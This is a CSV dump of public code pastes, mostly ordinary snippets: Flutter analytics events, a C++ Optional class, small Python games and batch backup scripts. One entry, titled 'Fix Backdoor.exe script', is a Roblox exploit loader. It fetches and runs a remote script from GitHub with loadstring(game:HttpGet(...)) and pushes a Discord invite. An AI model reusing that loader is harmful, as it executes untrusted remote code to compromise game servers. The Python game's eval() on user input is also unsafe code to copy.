id,title,username,language,date,content
yKPda3Ge,GA4 - app - flutter - ad_content_added,filipr27,Dart,Thursday 20th of July 2023 08:18:21 AM CDT,"// ad_category_seleceted
await firebaseAnalytics.logEvent(
  name: ""ad_content_added"",
  parameters: {
    ""ad_category"": knjige,
    ""business_type"": b2c,
    ""visitorStatus"": prijavljen,
  },
);"
J6KmGMss,GA4 - app - flutter - ad_category_seleceted,filipr27,Dart,Thursday 20th of July 2023 08:08:43 AM CDT,"// ad_category_seleceted
await firebaseAnalytics.logEvent(
  name: ""ad_category_seleceted"",
  parameters: {
    ""ad_category"": knjige,
    ""business_type"": b2c,
    ""visitorStatus"": prijavljen,
  },
);"
QWFPLV9E,Untitled,beekbonk,Lua,Thursday 20th of July 2023 08:05:06 AM CDT,"local damageBlock = script.Parent -- the block that damages the player
local damage = 5 -- the amount of damage dealt each time

local function onTouch(otherPart)
	local player = game.Players:GetPlayerFromCharacter(otherPart.Parent)
	if player then
		local character = player.Character
		local humanoid = character:FindFirstChild(""Humanoid"")
		if humanoid then
			while otherPart.Parent == character and humanoid.Health > 0 do
				humanoid:TakeDamage(damage)
				wait(1.0) -- waits for 0.5 seconds
			end
		end
	end
end

damageBlock.Touched:Connect(onTouch)
"
UFqix8vt,Урок 13 перегрузка по рвалуе,kutuzzzov,C++,Thursday 20th of July 2023 08:04:45 AM CDT,"/* Разместите здесь код класса Optional */
#include <stdexcept>
#include <utility>

// Исключение этого типа должно генерироватся при обращении к пустому optional
class BadOptionalAccess : public std::exception {
public:
    using exception::exception;

    virtual const char* what() const noexcept override {
        return ""Bad optional access"";
    }
};

template <typename T>
class Optional {
public:
    Optional() = default;
    Optional(const T& value);
    Optional(T&& value);
    Optional(const Optional& other);
    Optional(Optional&& other);

    Optional& operator=(const T& value);
    Optional& operator=(T&& rhs);
    Optional& operator=(const Optional& rhs);
    Optional& operator=(Optional&& rhs);

    ~Optional();

    bool HasValue() const;

    // Операторы * и -> не должны делать никаких проверок на пустоту Optional.
    // Эти проверки остаются на совести программиста
    T& operator*()& ;
    const T& operator*() const&;
    T* operator->();
    const T* operator->() const;
    T&& operator*()&&;

    // Метод Value() генерирует исключение BadOptionalAccess, если Optional пуст
    T& Value()&;
    const T& Value() const&;
    T&& Value()&&;

    void Reset();

    template <typename... Vs>
    void Emplace(Vs&&... vs);

private:
    // alignas нужен для правильного выравнивания блока памяти
    alignas(T) char data_[sizeof(T)];
    T* ptr_ = nullptr;
    bool is_initialized_ = false;
};

template <typename T>
Optional<T>::Optional(const T& value)
    : is_initialized_(true) {
    ptr_ = new(&data_[0]) T(value);
}

template <typename T>
Optional<T>::Optional(T&& value)
    : is_initialized_(true) {
    ptr_ = new(&data_[0]) T(std::move(value));
}

template <typename T>
Optional<T>::Optional(const Optional& other)
    : is_initialized_(other.is_initialized_) {
    if (is_initialized_) {
        ptr_ = new(&data_[0]) T(other.Value());
    }
}

template <typename T>
Optional<T>::Optional(Optional&& other)
    : is_initialized_(std::move(other.is_initialized_)) {
    if (is_initialized_) {
        ptr_ = new(&data_[0]) T(std::move(other.Value()));
    }
}

template <typename T>
Optional<T>::~Optional() {
    Reset();
}

template <typename T>
Optional<T>& Optional<T>::operator=(const T& value) {
    if (!is_initialized_) {
        ptr_ = new(&data_[0]) T(value);
        is_initialized_ = true;
    }
    else {
        *ptr_ = value;
    }
    return *this;
}

template <typename T>
Optional<T>& Optional<T>::operator=(T&& rhs) {
    if (!is_initialized_) {
        ptr_ = new(&data_[0]) T(std::move(rhs));
        is_initialized_ = true;
    }
    else {
        *ptr_ = std::move(rhs);
    }
    return *this;
}

template <typename T>
Optional<T>& Optional<T>::operator=(const Optional& rhs) {
    if (!is_initialized_) {
        if (rhs.is_initialized_) {
            ptr_ = new(&data_[0]) T(rhs.Value());
            is_initialized_ = rhs.is_initialized_;
        }
    }
    else {
        if (rhs.is_initialized_) {
            *ptr_ = rhs.Value();
        }
        else {
            Reset();
        }
    }
    return *this;
}

template <typename T>
Optional<T>& Optional<T>::operator=(Optional&& rhs) {
    if (!is_initialized_) {
        if (rhs.is_initialized_) {
            ptr_ = new(&data_[0]) T(std::move(rhs.Value()));
            is_initialized_ = std::move(rhs.is_initialized_);
        }
    }
    else {
        if (rhs.is_initialized_) {
            *ptr_ = std::move(rhs.Value());
        }
        else {
            Reset();
        }
    }
    return *this;
}

template <typename T>
bool Optional<T>::HasValue() const {
    return is_initialized_;
}

template <typename T>
T& Optional<T>::operator*()& {
    return *ptr_;
}

template <typename T>
const T& Optional<T>::operator*() const& {
    return *ptr_;
}

template <typename T>
T&& Optional<T>::operator*()&& {
    return std::move(*ptr_);
}

template <typename T>
T* Optional<T>::operator->() {
    return ptr_;
}

template <typename T>
const T* Optional<T>::operator->() const {
    return ptr_;
}

template <typename T>
T& Optional<T>::Value()& {
    if (!is_initialized_) {
        throw BadOptionalAccess();
    }
    return *ptr_;
}

template <typename T>
const T& Optional<T>::Value() const& {
    if (!is_initialized_) {
        throw BadOptionalAccess();
    }
    return *ptr_;
}

template <typename T>
T&& Optional<T>::Value()&& {
    if (!is_initialized_) {
        throw BadOptionalAccess();
    }
    return std::move(*ptr_);
}

template <typename T>
void Optional<T>::Reset() {
    if (is_initialized_) {
        ptr_->~T();
        ptr_ = nullptr;
    }
    is_initialized_ = false;
}

template <typename T> template <typename... Vs>
void Optional<T>::Emplace(Vs&&...vs) {
    if (HasValue()) {
        Reset();
    }
    ptr_ = new(&data_[0]) T(std::forward<Vs>(vs)...);
    is_initialized_ = true;
}"
hLVvi6C8,Untitled,wclovers,PHP,Thursday 20th of July 2023 07:49:09 AM CDT,"apply_filters( 'wcfm_vendor_store_taxomonies', $vendor_taxonomies, $this->get_id(), $taxonomy );"
1LA8giem,Untitled,wclovers,PHP,Thursday 20th of July 2023 07:45:37 AM CDT,"add_filter( 'wcfmmp_force_store_taxonomy_refresh', '__return_true' );"
RGUCYQ1b,advanturegame.py,DrAungWinHtut,Python,Thursday 20th of July 2023 07:42:45 AM CDT,"import os
import random
import msvcrt

def advanture_game():
    x_min = 0
    x_max = 10
    y_min = 0
    y_max = 10
    player_x = 5
    player_y = 5

    # q = quit
    while 1:
        key = msvcrt.getch().decode()
        if key == 'a':
            player_x = player_x - 1
            if player_x < x_min:
                player_x = x_min
        
        if key == 'd':
            player_x = player_x + 1
            if player_x > x_max:
                player_x = x_max
        
        if key == 'w':
            player_y = player_y - 1
            if player_y < y_min:
                player_y = y_min
        
        if key == 's':
            player_y = player_y + 1
            if player_y > y_max:
                player_y = y_max
        
        if key == 'q':
            print('Exiting advanture game')
            start()
        
        print(f'Player location is x={player_x},y={player_y}')
        for i in range(0,player_y):
            print()
        avater = ''
        for i in range(0,player_x):
            avater = avater + '  '
        avater = avater + '*'
        print(avater)
        


    

def lucky_test():
    os.system('cls')
    day = eval(input('please enter the day: '))
    month = eval(input('please enter the month: '))
    year = eval(input('please enter the year: '))
    num =  day + (month*12) + (year * 365)
    ans = num % 3
   
    if ans == 0:
        print(""Bad Luck"")
    elif ans == 1:
        print(""Normal"")
    else:
        print(""Lucky"")
    os.system('pause')

def dice_game():
    os.system('cls')    
    player = random.randint(1,6)
    computer = random.randint(1,6)
    print('Press any key to roll the dice')
    os.system('pause')
    print(f'player: {player}')
    print('Press any key to roll the dice for computer')
    os.system('pause')
    print(f'computer: {computer}')
    if player > computer:
        print('You win!')
    elif computer > player:
        print('You lose!')
    else:
        print('Draw')
    os.system('pause')

    


def start():
    os.system('cls')
    print('0-exit')
    print('1-baydin app')
    print('2-dice game')
    print('3-advanture game')
    
    choice = input('what is your choice? ')
    if choice == '0':
        print('exiting...')
        os.system('cls')
        exit()        
    elif choice == '1':
        lucky_test()
        
    elif choice == '2':
        dice_game()
    elif choice == '3':
        advanture_game()
    start()
        
   

   
# Start here
start()"
9GKxnZ9B,邀您一起看：书签管理：「编辑」-✎修改,xiaomianao666,JavaScript,Thursday 20th of July 2023 07:19:15 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥书签管理：「编辑」-✎修改@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImZpbGU6Ly8vc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJvaWQvZGF0YS9jb20uZXhhbXBsZS5oaWtlcnZpZWR1by9maWxlcy9Eb2N1bWVudHMvbmV3UGxhbkhvbWUuaHRtbFxcXCIsXFxuZGVzYzpcXFwiMTAwJSYmZmxvYXRcXFwiLFxcbmV4dHJhOntjYW5CYWNrOiB0cnVlfVxcbn1dKTtcIixcImdyb3VwXCI6XCJcIixcInBhZ2VzXCI6XCJbXVwifSIsInRpdGxlIjoi5Lmm562+566h55CG77ya44CM57yW6L6R44CNLeKcjuS/ruaUuSJ9
E3xuysPs,Untitled,kolbka_,Java,Thursday 20th of July 2023 07:10:13 AM CDT,"
package org.eclipse.buildship.gradleprop.provider;

import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Arrays;

import org.eclipse.lsp4e.server.ProcessStreamConnectionProvider;
import org.eclipse.lsp4e.server.StreamConnectionProvider;
import org.eclipse.core.runtime.FileLocator;
import org.eclipse.jdt.launching.IVMInstall;
import org.eclipse.jdt.launching.IVMInstallType;
import org.eclipse.jdt.launching.JavaRuntime;
import org.eclipse.jdt.launching.environments.IExecutionEnvironment;
import org.osgi.framework.FrameworkUtil;
import org.osgi.framework.Bundle;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.file.Path;
import java.nio.file.Paths;
import org.eclipse.swt.SWT;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.MessageBox;
import org.eclipse.swt.widgets.Shell;
import org.eclipse.ui.PlatformUI;

public class ConnectionProvider extends ProcessStreamConnectionProvider
    implements StreamConnectionProvider {

  public GradlePropertiesConnectionProvider() {
    URL localFileURL;
    Bundle bundle = FrameworkUtil.getBundle(ConnectionProvider.class);
    try {
      localFileURL = FileLocator.toFileURL(bundle.getEntry(""/""));
      URI localFileURI = new URI(localFileURL.toExternalForm());
      Path pathToPlugin = Paths.get(localFileURI.getPath());

      String pathToServer = pathToPlugin.resolve(""libs/kotlin-language-server.jar"").toString();

      IExecutionEnvironment[] executionEnvironments = JavaRuntime.getExecutionEnvironmentsManager()
          .getExecutionEnvironments();

      IExecutionEnvironment java11Environment = null;

      for (IExecutionEnvironment environment : executionEnvironments) {
        if (environment.getId().equals(""JavaSE-11"")) {
          java11Environment = environment;
          break;
        }
      }

      ArrayList<IVMInstall> compatibleJVMs = new ArrayList<>(
          Arrays.asList(java11Environment.getCompatibleVMs()));
      IVMInstall defaultVMInstall = JavaRuntime.getDefaultVMInstall();
      IVMInstall javaExecutable = null;

      if (!compatibleJVMs.isEmpty()) {
        if (compatibleJVMs.contains(defaultVMInstall)) {
          javaExecutable = defaultVMInstall;
        } else {
          javaExecutable = compatibleJVMs.get(0);
        }

        String pathToJavaExecutable = javaExecutable.getInstallLocation().toPath().resolve(""bin"")
            .resolve(""java"")
            .toString();

        List<String> commands = new ArrayList<>(
            Arrays.asList(pathToJavaExecutable, ""-jar"", pathToServer));

        // add in commands path to bin application of language server
        setCommands(commands);
        setWorkingDirectory(pathToPlugin.toString());
        
      } else {
        PlatformUI.getWorkbench().getDisplay().syncExec(new Runnable() {
          public void run() {
            Shell shell = new Shell();
            MessageBox messageBox = new MessageBox(shell, SWT.ICON_WARNING | SWT.OK);
            messageBox.setText(""Error"");
            messageBox.setMessage(
                ""Compatible version of Java isn't found! Install and rerun application."");
            messageBox.open();
            shell.dispose();
          }
        });
      }


    } catch (IOException | URISyntaxException e) {
      System.err.println(""[GradlePropertiesConnectionProvider]:"" + e.toString());
      e.printStackTrace();
    }
  }

}
"
A5YCw4HQ,"Treeview with python 3   Makes finding folders files  easy  Ideal  for coders , programmers",Mark2020H,Python,Thursday 20th of July 2023 07:10:01 AM CDT,"#!/usr/bin/env python3

# You will need to install the Lato-Medium.ttf font on this 
# To do this use  https://fonts.google.com/specimen/Lato?query=Lato  and download font family

# This will downlaod a zip 
# Open this zip folder and extract then goto that folder and double click the Lato-Medium.ttf file
# This will open system font viewer  and within this is and install button  
# Install this font  for system wide all users 
# MD Harrington 20/07/23  London UK Kent

import os
import colorama
from colorama import Fore, Style
import time
from PIL import Image, ImageDraw, ImageFont
import tkinter as tk
from PIL import ImageTk

class Tree_Creator:

    @staticmethod
    def list_files(folder_path, indent="""", file=None):
        output_text = """"
        for item in os.listdir(folder_path):
            item_path = os.path.join(folder_path, item)
            if os.path.isdir(item_path):
                output_text += (indent + ""|-- "" + item + ""/\n"")
                Tree_Creator.typewriter_print(indent + ""|-- "" + item + ""/\n"", color=Fore.YELLOW)
                file.write(indent + ""|-- "" + item + ""/\n"")
                output_text += Tree_Creator.list_files(item_path, indent + ""    "", file)
            else:
                output_text += (indent + ""|-- "" + item + ""\n"")
                Tree_Creator.typewriter_print(indent + ""|-- "" + item + ""\n"", color=Fore.RED)
                file.write(indent + ""|-- "" + item + ""\n"")
        return output_text

    @staticmethod
    def main():
        # Prompt user for folder name
        Tree_Creator.typewriter_print(""Enter a folder name: "", color=Fore.CYAN)
        folder_name = input("": "")

        # Search for the folder in the user's home area
        home_directory = os.path.expanduser(""~"")
        folder_path = None
        for root, dirs, files in os.walk(home_directory):
            if folder_name in dirs:
                folder_path = os.path.join(root, folder_name)
                break

        # Verify if the folder exists
        if folder_path is None:
            print(""Folder not found."")
            exit(1)

        # Change to the directory
        os.chdir(folder_path)

        # Save folder structure to file
        output_filename = ""Project_Tree.txt""
        with open(output_filename, ""w"") as file:
            file.write(""Folder Structure:\n"")
            output_text = Tree_Creator.list_files(folder_path, file=file)

        # Create and display the image
        Tree_Creator.create_image(output_text, ""folder_structure.png"")

        # Print folder structure saved message
        Tree_Creator.typewriter_print(""Folder structure saved to: "", color=Fore.GREEN)
        Tree_Creator.typewriter_print(os.path.abspath(output_filename), color=Fore.CYAN)

    @staticmethod
    def typewriter_print(text, color=Fore.WHITE, delay=0.04):
        for char in text:
            print(color + char, end='', flush=True)
            time.sleep(delay)
        print(Style.RESET_ALL)

    @staticmethod
   
    def create_image(text, output_filename):
        # Set the font properties
        font_size = 20  # Updated font size
        line_spacing = 10  # Extra line spacing
        font_path = ""/usr/share/fonts/truetype/lato/Lato-Medium.ttf""
        font = ImageFont.truetype(font_path, font_size)

        # Create a sample image to calculate line height and maximum line width
        sample_image = Image.new(""RGB"", (1, 1))
        sample_draw = ImageDraw.Draw(sample_image)
        line_height = sample_draw.textbbox((0, 0), ""A"", font=font)[3]  # Calculate line height based on a sample character
        line_height_with_spacing = line_height + line_spacing  # Line height with extra spacing
        max_line_width = max(sample_draw.textbbox((0, 0), line, font=font)[2] for line in text.split(""\n""))  # Calculate maximum line width

        # Calculate the image size based on the text
        image_width = int(max_line_width) + 20
        image_height = int(line_height_with_spacing) * len(text.split(""\n"")) + 20

        # Create a new image
        image = Image.new(""RGB"", (image_width, image_height), (0, 0, 255))
        draw = ImageDraw.Draw(image)

        # Draw the text on the image with extra line spacing
        y = 10
        for line in text.split(""\n""):
            draw.text((10, y), line, fill=(0, 0, 0), font=font)
            y += line_height_with_spacing

        # Display the image in a GUI window
        root = tk.Tk()
        root.title(""Image Viewer"")

        img = ImageTk.PhotoImage(Image.open(output_filename))
        panel = tk.Label(root, image=img)
        panel.pack()

        root.mainloop()




# Run the main method if executed as a script
if __name__ == '__main__':
    colorama.init()
    Tree_Creator.main() # RcvSerHDF5
"
cpzLCsyk,Untitled,ShiinaBR,C#,Thursday 20th of July 2023 07:05:29 AM CDT,"[
""7F2E96A8331098ACD5BB8DC29D4A3F57:kDTbN2yRZAIwEEQsF2zoJwdhtsK0lcb5zEuon7vziuk=""
]"
M2FsEVhW,AliceIsntDead,cigcag,PowerShell,Thursday 20th of July 2023 06:32:22 AM CDT,"$mp3url = New-Object System.Xml.XmlDocument
$mp3url.Load(""http://feeds.nightvalepresents.com/aliceisntdeadpodcast"")
Set-Content alice_mp3_links.txt -Value $mp3url.rss.channel.item.enclosure.url
"
XiJe61DN,Fix Backdoor.exe script,A_GUES,Lua,Thursday 20th of July 2023 06:12:11 AM CDT,"local httpService = game:GetService(""HttpService"");

local invCode = ""xJHCqm84cW"";
local httpRequest = (syn and syn.request) or http_request;

local function launchDiscord()
if not httpRequest then 
        warn(""Exploit not supported. No HTTP found."") 
        return 
    end

httpRequest({
Url = ""http://127.0.0.1:6463/rpc?v=1"",
Method = ""POST"",

Headers = {
['Content-Type'] = 'application/json',
Origin = 'https://discord.com'
},

Body = httpService:JSONEncode({
cmd = 'INVITE_BROWSER',
nonce = httpService:GenerateGUID(false),
args = {code = invCode}
})
})
end;

local NotificationBindable = Instance.new(""BindableFunction"")
NotificationBindable.OnInvoke = launchDiscord

game:GetService(""StarterGui""):SetCore(
""SendNotification"",
{
Title = ""backdoor.exe"",
Duration = 5,
Text = ""Loading lastest version!\n\nJoin our Discord for games, scripts and more"",
Button1 = ""Join Discord!"",
Callback = NotificationBindable
}
)

if httpRequest then
    loadstring(game:HttpGet(""https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua""))();
end
"
kWFS7j6g,Binary search,LEGEND2004,C++,Thursday 20th of July 2023 06:07:13 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define int long long

signed main()
{
    int n , q , x;
    cin >> n >> q;
    vector<int> a(n);
    for(int i = 0; i < n; i++){
        cin >> a[i];
    }
    while(q--){
        cin >> x;
        int l = 0 , r = n - 1;
        while(l < r){
            int mid = (l + r) / 2;
            if(a[mid] < x){
                l = mid + 1;
            }else{
                r = mid;
            }
        }
        //l == r
        cout << ((a[l] == x) ? ""YES"" : ""NO"") << endl;
    }
}
"
WgrLfKGJ,data639,TestGuy1,JSON,Thursday 20th of July 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '549464c9dfc6bdd06fea133dcdca825cbc6e76303eb3c51a5541e75403b730384cd9f9154e6d44266ba8ef35c623815d9c065362e88d827f8571ff185fa66c34eb2d82376a83657fcc66cc75145fda1d2f87d1ae668fc40112ebc209e93b86b1d36a6a110785dfc565d4b9313fa5ba700eceb07810b7f39ccf143659c90fb156',
  otherdata: [
    '456777c5bb8533691c8a927e0d66f308',
    '38de0f93bf50aa36f4039c3716436446',
    '8509b1e1ab1f0dc93207a4bf3e12e7b3',
    '13d47577d4788b1ab7cdab7bdcc0a34b',
    '62f6a94fb0c130f38e0c3eade489fdc4',
    '6590698e168e46d46306829a2a7dbf28',
    '296a17edf903ec2836caf9b64834081e',
    '1f28f232561a13f8290932738b6bd1cd'
  ]
}"
B4kDvQXw,Silent_mode.bat,GlobalAccessSoftware,Batch,Thursday 20th of July 2023 05:30:37 AM CDT,"

::: RC8 Update! :::

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::: Silent_mode.bat by John Paul Edwards April 10, 2023
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::: Launch AAA_Sync in Silent Mode, output to Logfile :::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::     -- output to Logfile Pending: rev 8.2+ --
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::

             :::::::[ PROGRAM MAIN ]:::::::
  @echo off
  if not defined vers set vers=v8.5.7.81 20230720013918 by -JpE-

:main
  set titl2=Silent_mode.bat %vers% launched: %date% @ %time%
  title %titl2%
  set bats=C:\Users\%username%\Documents\AAA Sync2Laptop\Batch Files\BCS-Suite
  if not exist ""%bats%"" echo . & echo Folder not found! & echo . & pause & exit
  set util1=""%bats%\utility1.bat""
  if not exist %util1% echo . & echo %util1% not found! & echo . & pause & exit

::start
  set ty1=25 & set /a code2=0
  call %util1% ""shotcaller""
  ::: Defaults to this ^ label if no arg passed.

REM ::: *** Test Code for ErrorHandling.bat
REM set /a code2=7

  if %code2% equ 7 goto err1
  set msg=""Ready to Run Backups? (Y/n): ""
  choice /c yn /n /t 10 /d y /m %msg%
  if %errorlevel% equ 2 goto return

REM ::: *** Test Code Until Ready to Rock-On!
REM echo . & echo Test Completed. & echo . & pause & echo .
REM goto return

  echo . & echo Proceeding... & echo .
  set AAA=""%bats%\AAA-Sync.bat""
  if not exist %AAA% echo . & echo %AAA% not found! & echo . & goto err1
  set filename1=""%bats%\overrider3.txt""
  ::: Purely a runtime file ^ see usages implementing override1 in %AAA% @:restart and the override1 var thereafter in several of the BCS code files. (Load Session, Use Search ALL Open Documents)
  if exist %filename1% del /f /s /q %filename1%
  copy %util1% %filename1% & call %AAA%
  if exist %filename1% del /f /s /q %filename1%
  title %titl2%


:return
  echo . & echo .
  set msg=""Review what happened? (y/N): ""
  choice /c yn /n /t %ty1% /d n /m %msg%
  if %errorlevel% equ 1 echo . & pause & echo . & goto return
  exit /b %errorlevel%
 
 
                    :::::::[ Error and Exit Routines ]:::::::
:err1
  echo oopsie an error sent Flow here. Get on it!
  set txt= OMG It fn Werked! Error Detected Successfully!
  title %txt%
  
REM ::: Testcode -
REM echo . & echo txt == %txt% & echo . & pause & echo .

  set ""sender1=Silent_mode.bat""
  set err2=""%bats%\ErrorHandling.bat""
  if exist %err2% call %err2% ""%txt%"", %sender1%
  goto return



:::  100%  -JpE-


"
jCnGsWc3,ErrorHandling.bat,GlobalAccessSoftware,Batch,Thursday 20th of July 2023 05:30:05 AM CDT,"

:::  RC8 Update!  :::

:::::::::::::::::::::::::::::::::::::::::::::::
:: ErrorHandling.bat by -JpE- 20220628231816 ::
:::::::::::::::::::::::::::::::::::::::::::::::

  if not defined vers set vers=v8.5.7.82 20230720014017 by -JpE-
  ::: set testwell=3 to enter test mode.
  set /a testwell=1

::: Proof of Concept for makeline function below.
:welcome
  set /a counter213=0
  set txt2= Welcome to ErrorHandling! 
  call :makeline ""%txt2%"" line
  echo . & echo . & echo %line%
  echo %txt2% & echo %line% & echo .
  goto start


:makeline <string strToPadTo, string line2Fill>
  if not exist %util1% echo . & echo %util1% not found! & echo . & pause & goto return
  setlocal
  set txt3=%~1
  set ""newline=%~2""
  set charsForPadding=*-=-
  set sizer=""%bats%\string_length.bat""
  if exist %sizer% call %sizer% chars1 charsForPadding
  set call411=caller2
  call %util1% %call411% ""%txt3%"" 0
  set /a size2=((%actualSize2%+%chars1%)/%chars1%)
  set call411=padder
  call %util1% %call411% ""test5"" %size2%
  set newline=%line1%
  endlocal & set ""%~2=%newline%""  
  exit /b %errorlevel%


:start
  set txt=Backup & if not defined r3v3rs3 set /a r3v3rs3=1
  if %r3v3rs3% equ 2 set txt=RESTORE
  echo . & set myLine1= Calling the ErrorHandling.bat  %vers% 
  call :makeline ""%myLine1%"" line
  set /a larger1=%actualSize2% & set line4=%line%  
  set myLine2= ATTENTION: AN ERROR HAS JUST OCCURRED IN THE %oper% %txt% Operation. & call :makeline ""%myLine2%"" line
  if %actualSize2% gtr %larger1% set line4=%line%
  echo %line4% & echo %myLine1%
  echo %line4% & echo %myLine2% & echo %line4% & echo .
  if not defined where set /a where=0
  if %where% gtr 5 goto fatal
  if %code2% equ 5 (goto nothingSent) else (if %code2% neq 7 if exist %test% goto unhandled)
  ::: SPLIT DOWN TO ISOLATE NEWEST CODE BELOW.
  if %testwell% equ 3 call :testcode
  goto tester


:drive
  echo %l2% & echo . & echo "" >>===> UNLOCK BITLOCKER for D:\ AND TRY AGAIN."" & echo .
  set msg=""Are you ready to try again? (Y/n): ""
  choice /c yn /n /t 180 /d y /m %msg%
  echo . & echo %l2% & if %errorlevel% neq 2 set /a exit2=5
  if %counter213% lss 3 set /a counter213+=1 & goto drive
  goto return


:okay
  echo .
  echo %sl%
  echo          ****  Operation  (s) Cancelled by: %username%  ****
  echo %sl%
  echo .
  echo %line%
  goto return


::: Fatal Error! ** if %where% equ 6 **
:fatal
  echo %l2% & echo . & echo %sl%
  echo            **  ""FATAL ERROR: #""%where% <-===<< **
  echo           **** ""copies_backups.bat"" Can't be Found! ****
  echo %sl% & echo . & pause & echo . & echo %l2% & set /a exit2=6
  goto return


:::  DEVELOPING (as needed below)
:::  echo if %where% equ 1 thru 4 then blah blah bla
:::  Called from copy_control.bat
:unhandled
  echo %time%
  call :testcode
  echo An unhandled exception has occurred
  echo in the copy-subs some ""where:""
  echo . & echo where == %where% & echo . & pause & echo .
  goto return


  :::-=[ DANGER! UNDER CONSTRUCTION. HARD HAT REQUIRED ]=-:::

:testcode <GLOBAL: no args sent or returned>
  echo errorlevel == %errorlevel% & echo . & echo code2 == %code2% & echo . & pause & echo .
  exit /b %errorlevel%


::: Analyze what code2==7 really means and what we need to do about it.
:next <stringVar msg1, stringVar sender, stringVarReturned next>
echo . & echo Made it to :next! & echo . & pause & echo .
  setlocal
  set ""msg1=%~1""
  set ""sender=%~2""
  set ""next=%~3""
  echo .
  echo .
  REM echo handles errors from other files. & if %sender% equ ""Silent_mode.bat"" (set next=DoThis) else (set next=DoThat)
  echo .
  echo msg1 == %msg1%, and batfile caller == %sender%
  call :testcode
  if %errorlevel% equ 0 echo . & echo The :next function succeeded! & echo . & pause & echo .
::: To TestWell
set ""sender=util2.bat""
  if %sender% == ""Silent_mode.bat"" (set ""next=next1"") else (set ""next=next2"")
  endlocal & set ""%~3=%next%""
  exit /b %errorlevel%


::: next1 experiment
:next1
  echo . & set line1= This error was detected in the Silent_mode.bat Code File.
  call :makeline %line1% line
  echo %line% & echo %line1% & echo %line% & echo . & pause & echo .
  
echo Made it to NEXT1! & echo . & pause & echo .

  goto return


:tester
  if %code2% equ 7 call :next ""%~1"" ""%~2"" num
  if %testwell% equ 3 call :testcode
  if %code2% neq 7 goto return
  
  ::: It is now implicite that errorlevel is zero and code2 == 7!
  if %errorlevel% neq 0 echo . & echo OH NO! & echo . & pause & echo . & goto return
  if %testwell% neq 3 echo . & echo NOT IN TEST MODE RIGHT NOW! & echo . & goto return

echo . & echo num == %num% & echo . & pause & echo .

  if %num% neq """" (call :%num%) else (echo echo . & echo Unanticipated! & echo . & pause & goto unhandled)
  goto return


:next2 <stringVar sender, stringVar result>
  setlocal
  set ""sender=%~1""
  set ""result=%~2""
  echo The error was detected in %sender% on %date% @ %time%
  set result= I'm not sure what this will eventually do.

echo . & echo Now we have hit ""next2"" function! & echo . & echo sender == %sender%, and result == %result% & echo . & pause & echo .

  endlocal & set ""%~2=%result%""
  exit /b %errorlevel%

::: Early Design Phase Only, down in here. Experimenting.

:nothingSent
  echo . & echo Nothing THERE-ERROR! & echo . & pause & echo .


  goto return

REM ::: ^ UNDER CONSTRUCTION (Layout)


:return
REM :: TESTCODE
REM echo . & echo The End of ErrorHandling module. & echo . & pause & echo .
  exit /b %errorlevel%



:: 100% -JpE-



"
